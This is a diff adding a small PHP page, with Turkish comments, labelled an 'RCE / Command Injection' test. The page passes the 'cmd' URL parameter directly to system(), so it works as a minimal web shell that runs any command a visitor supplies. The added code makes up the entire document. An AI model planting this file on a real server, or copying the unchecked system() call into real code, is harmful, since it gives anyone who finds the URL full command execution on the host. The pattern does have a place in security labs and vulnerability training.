@@ -1,0 +1,14 @@
+<?php
+// Parametreden gelen değeri çalıştırıyor
+if (isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+    system($cmd);
+}
+?>
+
+<html>
+<body>
+<h1>RCE / Command Injection Testi</h1>
+<p>Komut çalıştırmak için URL'ye ?cmd=komut yazın</p>
+</body>
+</html>
